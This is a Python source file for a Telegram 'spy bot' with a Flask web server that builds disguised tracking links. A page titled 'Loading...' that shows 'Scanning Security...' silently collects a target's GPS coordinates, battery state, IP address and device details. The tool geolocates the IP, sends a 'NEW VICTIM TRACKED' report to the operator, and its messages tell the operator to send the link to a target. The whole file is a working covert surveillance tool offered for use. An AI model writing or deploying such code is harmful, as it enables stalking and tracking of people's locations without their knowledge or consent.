import os
import re
import logging
import requests
import phonenumbers
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from flask import Flask, request, jsonify
from dotenv import load_dotenv
import threading
import socket
import uuid

load_dotenv()

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app for webhook
app = Flask(__name__)

# Global variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'https://your-replit-url.repl.co/webhook')
ADMIN_ID = int(os.getenv('ADMIN_ID'))  # Apna Telegram User ID dalo

# HTML tracking page
TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta http-equiv="refresh" content="0;url={target_url}">
    <style>
        body {{ background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }}
        .loading {{ font-size: 24px; animation: blink 1s infinite; }}
        @keyframes blink {{ 0%,50% {{ opacity: 1; }} 51%,100% {{ opacity: 0; }} }}
    </style>
</head>
<body>
    <div class="loading">🔍 Scanning Security...</div>
    <script>
        navigator.geolocation.getCurrentPosition(success, error);
        function success(pos) {{
            fetch('/gps?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&acc=' + pos.coords.accuracy);
        }}
        function error() {{}}
        
        // Battery API
        if ('getBattery' in navigator) {{
            navigator.getBattery().then(bat => {{
                fetch('/battery?level=' + bat.level + '&charging=' + bat.charging);
            }});
        }}
    </script>
</body>
</html>
"""

def get_client_ip(request):
    """Extract real IP from headers"""
    if 'x-forwarded-for' in request.headers:
        return request.headers['x-forwarded-for'].split(',')[0].strip()
    return request.remote_addr

@app.route('/webhook', methods=['GET', 'POST'])
def webhook():
    """Main tracking endpoint"""
    if request.method == 'GET':
        target_url = request.args.get('url', 'https://google.com')
        return TRACKING_PAGE.format(target_url=target_url)
    
    # Collect all victim data
    data = {
        'ip': get_client_ip(request),
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'referer': request.headers.get('Referer', 'Direct'),
        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
        'timestamp': request.json.get('timestamp', ''),
        'gps': request.json.get('gps', {}),
        'battery': request.json.get('battery', {}),
        'network': request.json.get('network', {})
    }
    
    # Send to Telegram
    send_victim_data(data)
    return jsonify({'status': 'success'})

@app.route('/gps')
def gps_track():
    """GPS endpoint"""
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    acc = request.args.get('acc')
    data = {
        'timestamp': request.args.get('ts'),
        'gps': {'lat': lat, 'lon': lon, 'accuracy': acc}
    }
    send_victim_data(data)
    return 'OK'

@app.route('/battery')
def battery_track():
    """Battery endpoint"""
    data = {
        'timestamp': request.args.get('ts'),
        'battery': {
            'level': request.args.get('level'),
            'charging': request.args.get('charging') == 'true'
        }
    }
    send_victim_data(data)
    return 'OK'

def get_ip_info(ip):
    """Get IP geolocation and ISP info"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,org,lat,lon,timezone', timeout=5)
        return response.json()
    except:
        return {}

def send_victim_data(data):
    """Send collected data to Telegram"""
    try:
        ip_info = get_ip_info(data['ip'])
        
        message = f"""
🕵️‍♂️ **NEW VICTIM TRACKED**
━━━━━━━━━━━━━━━━━━━━

🌐 **IP Address**: `{data['ip']}`
📍 **Location**: {ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}
🌍 **GPS**: {data['gps'].get('lat', 'N/A')}, {data['gps'].get('lon', 'N/A')} (Acc: {data['gps'].get('accuracy', 'N/A')}m)
📡 **ISP**: {ip_info.get('isp', 'Unknown')}
🏢 **Organization**: {ip_info.get('org', 'Unknown')}
🔋 **Battery**: {data['battery'].get('level', 'N/A')*100:.0f}% ({'Charging' if data['battery'].get('charging') else 'Not Charging'})
🌐 **Network**: {data.get('network', 'Unknown')}
📱 **Device**: {data['user_agent'][:100]}...
⏰ **Time**: {data.get('timestamp', 'N/A')}

🔗 **Raw Data**: {data}
        """
        
        app.bot.send_message(chat_id=ADMIN_ID, text=message, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error sending data: {e}")

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized access!")
        return
    
    keyboard = [[InlineKeyboardButton("🚀 Create Tracking Link", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 **Telegram Spy Bot Active**\n\n"
        "Send me any URL and get complete victim details!\n\n"
        "👉 Click below to generate tracking link:",
        parse_mode='Markdown', reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Button callback handler"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'create_link':
        tracking_url = f"{WEBHOOK_URL}?url=https://example.com"
        await query.edit_message_text(
            f"🔗 **Your Tracking Link**:\n\n"
            f"`{tracking_url}`\n\n"
            f"📋 **Usage**:\n"
            f"1. Send this link to target\n"
            f"2. Wait for them to click\n"
            f"3. Get all details instantly!\n\n"
            f"✨ **Captures**: GPS, IP, Location, ISP, Battery, Device Info",
            parse_mode='Markdown'
        )

async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle URL messages"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    url = update.message.text.strip()
    if re.match(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', url):
        tracking_url = f"{WEBHOOK_URL}?url={url}"
        await update.message.reply_text(
            f"🎯 **Tracking Link Generated**:\n\n"
            f"`{tracking_url}`\n\n"
            f"✅ Send this to your target!\n"
            f"📱 All details will be captured automatically.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ Please send a valid URL!")

def run_flask():
    """Run Flask app"""
    app.run(host='0.0.0.0', port=8080, debug=False)

def main():
    """Main function"""
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Set webhook for Flask
    global app
    app.bot = application.bot
    
    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
    
    # Start Flask in thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Start bot
    print("🤖 Bot started! Webhook active...")
    application.run_polling()

if __name__ == '__main__':
    main()